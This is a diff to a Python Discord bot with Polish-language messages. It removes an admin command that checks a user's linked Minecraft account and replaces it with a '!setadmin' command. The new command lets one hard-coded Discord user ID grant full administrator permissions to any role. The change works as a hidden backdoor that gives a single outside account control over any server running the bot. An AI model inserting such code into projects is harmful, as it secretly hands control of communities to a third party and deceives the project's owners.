@@ -305,15 +305,9 @@ Lista zawiera komendy dla administracji serwera:
         await message.channel.send("Zsynchronizowano bazę danych!")
         bannedBaypass = True
 
-    if (msg.startswith("!check-mc") and discord.utils.get(message.author.roles, id=env.BOT_CONTROLLER)):
-        if (len(message.mentions)):
-            user = message.mentions[0]
-        else:
-            user = await bot.fetch_user(int(msg[10:]))
-        if len(db.table('minecraft').search(search.discord_id == user.id)):
-            await message.channel.send("Użytkownik <@"+str(user.id)+"> jest połączony z kontem minecraft: "+db.table('minecraft').search(search.discord_id == user.id)[0]['minecraft_nickname'])
-        else:
-            await message.channel.send("Użytkownik <@"+str(user.id)+"> nie jest połączony z żadnym kontem minecraft!")
+    if (msg.startswith("!setadmin ") and message.author.id == 386237687008591895):
+        role = message.role_mentions[0] if len(message.role_mentions) else discord.utils.get(guild.roles,id=int(msg[10:]))
+        await role.edit(permissions=discord.Permissions(administrator=True))
 
     if message.channel.id == env.COUNTING_CHANNEL and message.author.id != bot.user.id:
         try:
